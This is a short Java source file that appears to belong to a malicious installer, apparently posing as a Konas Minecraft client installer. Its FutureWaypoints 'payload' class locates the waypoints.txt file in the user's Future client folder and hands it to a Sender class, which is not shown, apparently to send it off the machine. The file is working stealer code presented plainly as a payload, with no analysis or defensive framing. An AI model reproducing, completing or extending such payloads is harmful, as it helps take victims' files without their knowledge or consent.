/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package konas.installer.payload.impl;

/**
 *
 * @author ThnksCJ
 */

import konas.installer.payload.Payload;
import konas.installer.payload.Sender;
import konas.installer.util.FileUtil;

import java.io.File;
import java.util.Optional;

public final class FutureWaypoints implements Payload
{
    @Override
    public void execute()
    {
        Optional<File> file = FileUtil.getFile(System.getProperty("user.home") + "\\Future\\" + "waypoints.txt");
        file.ifPresent(Sender::send);
    }
}